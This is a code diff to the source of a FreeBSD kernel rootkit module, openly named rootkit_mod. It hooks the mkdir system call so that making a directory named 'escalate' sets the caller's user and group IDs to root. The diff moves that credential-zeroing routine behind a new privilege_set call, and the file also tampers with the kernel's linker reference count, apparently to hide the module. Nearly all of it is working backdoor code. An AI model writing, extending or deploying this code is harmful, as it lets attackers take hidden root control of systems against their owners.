@@ -17,6 +17,7 @@
 
 #include "config.h"
 #include "debug.h"
+#include "privilege.h"
 
 static int
 load(struct module *module, int cmd, void *arg)
@@ -61,7 +62,7 @@ mkdir_hook(struct thread *td, void *syscall_args) {
 
 	if (strcmp(path, "escalate") == 0)
 	{
-		escalate_privledge(td);
+		privilege_set(td, 0);
 	}
 
 	return(sys_mkdir(td, syscall_args));
@@ -157,16 +158,6 @@ void
 decrement_kernel_image_ref_count(void)
 {
 	(&linker_files)->tqh_first->refs--;
-}
-
-void
-escalate_privledge(struct thread * td)
-{
-	td->td_ucred->cr_uid = 0;
-	td->td_ucred->cr_ruid=0;
-	td->td_ucred->cr_svuid = 0;
-	td->td_ucred->cr_rgid = 0;
-	td->td_ucred->cr_svgid = 0;
 }
 
 static moduledata_t rootkit_mod = {
